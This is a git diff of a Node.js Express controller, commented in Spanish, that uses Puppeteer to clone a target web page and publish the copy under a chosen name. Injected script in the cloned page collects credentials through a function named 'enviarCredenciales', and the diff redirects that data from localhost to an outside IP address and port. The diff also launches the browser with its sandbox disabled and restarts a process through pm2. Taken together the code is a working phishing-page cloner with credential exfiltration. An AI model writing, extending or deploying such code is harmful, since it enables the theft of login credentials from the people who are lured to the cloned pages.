@@ -1,14 +1,16 @@
-// backend/src/controller/clone.controller.js
 import puppeteer from 'puppeteer';
 import fs from 'fs';
 import path from 'path';
+import { exec } from 'child_process'; // PRUEBA
 
 export const clonePage = async (req, res) => {
     try {
         const { name, url } = req.body;
         if (!name || !url) return res.status(400).json({ message: 'name y url requeridos' });
 
-        const browser = await puppeteer.launch();
+        const browser = await puppeteer.launch({
+		args: ['--no-sandbox', '--disable-setid-sandbox']
+	});
         const page = await browser.newPage();
 
         await page.goto(url, { waitUntil: 'networkidle2' });
@@ -49,7 +51,7 @@ export const clonePage = async (req, res) => {
 
                 function enviarCredenciales() {
                     const data = getCredenciales();
-                    fetch('http://localhost:3000/api/capture/capture', {
+                    fetch('http://146.83.198.35:1606/api/capture/capture', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(data)
@@ -78,11 +80,25 @@ export const clonePage = async (req, res) => {
 
         const html = await page.content();
 
-        const folderPath = path.resolve(`../frontend/public/${name}`);
+        const folderPath = path.resolve(`../../frontend/public/${name}`);
         fs.mkdirSync(folderPath, { recursive: true });
         fs.writeFileSync(`${folderPath}/index.html`, html);
 
         await browser.close();
+
+	// PRUEBA
+
+	exec('pm2 restart 1', (error, stdout, stderr) => {
+            if (error) {
+                console.error(`Error al reiniciar frontend: ${error.message}`);
+                // Puedes decidir qué hacer aquí: si es un error crítico o solo un log.
+                // No debería impedir que la respuesta al usuario se envíe.
+            }
+            if (stderr) {
+                console.error(`Stderr al reiniciar frontend: ${stderr}`);
+            }
+            console.log(`Frontend reiniciado con éxito: ${stdout}`);
+        });
 
         res.status(200).json({ message: `Página clonada como ${name}` });
     } catch (error) {
